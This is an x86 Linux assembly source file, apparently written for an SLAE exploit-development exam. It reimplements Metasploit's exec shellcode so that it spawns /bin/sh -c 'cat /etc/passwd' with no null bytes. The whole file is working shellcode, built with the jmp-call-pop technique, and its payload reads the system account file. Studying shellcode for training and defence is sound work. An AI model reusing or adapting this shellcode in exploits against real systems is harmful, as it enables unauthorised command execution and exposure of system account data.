; Filename: metasploit_exec.nasm
; Author: Ray Doyle (@doylersec)
; Website: https://www.doyler.net
;
; Purpose: SLAE Exam Assignment #5 - Metasploit exec shellcode (Linux/x86) for `cat /etc/passwd` with no null bytes

global _start

section .text

_start:
   push 0xb
   pop eax
   cdq
   push edx
   push word 0x632d
   mov edi,esp
   push edx
   push 0x68732f2f
   push 0x6e69622f
   mov ebx, esp
   push edx

pre_exec:
   jmp call_exec

exec:
   push edi
   push ebx
   mov ecx,esp
   int 0x80

call_exec:
   call exec
   userinfo: db "cat /etc/passwd"
